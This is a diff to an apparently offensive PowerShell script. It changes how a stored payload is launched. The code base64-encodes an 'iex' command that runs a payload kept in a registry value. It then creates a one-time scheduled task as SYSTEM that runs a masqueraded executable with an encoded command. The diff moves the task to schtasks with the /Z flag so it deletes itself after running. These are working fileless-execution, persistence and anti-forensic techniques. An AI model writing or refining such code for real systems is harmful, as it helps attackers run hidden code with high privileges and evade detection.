@@ -108,19 +108,18 @@ if ($checkVal) {
     Write-Log "[-] Registry payload FAILED"
 }
 
-# 5. Create scheduled task with dynamic time (1 min from now)
+# 5. Create scheduled task with dynamic time (30s from now) via schtasks /Z
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
     "iex(gp '$regPath').$regName"
 ))
-$taskAction = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
-$taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
-$taskSettings = New-ScheduledTaskSettingsSet -DeleteExpiredTaskAfter "00:00:01" -Compatibility Win8
-try {
-    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -User "SYSTEM" -Force -ErrorAction Stop
+$taskTime = (Get-Date).AddSeconds(30).ToString("HH:mm")
+$taskCmd = "schtasks /create /tn $taskName /ru SYSTEM /tr `"$masqueradeDst -NoP -Enc $b64`" /sc ONCE /st $taskTime /Z /f"
+$result = cmd /c $taskCmd 2>&1
+if ($LASTEXITCODE -eq 0) {
     Write-Log "[+] Task $taskName created (verified)"
-    Write-Host "[+] Task '$taskName' scheduled. Running now..."
+    Write-Host "[+] Scheduled. Waiting 30s for execution..."
     Start-ScheduledTask -TaskName $taskName
     Write-Log "[*] Task $taskName triggered"
-} catch {
-    Write-Log "[-] Task creation FAILED - $_"
+} else {
+    Write-Log "[-] Task creation FAILED - $result"
 }
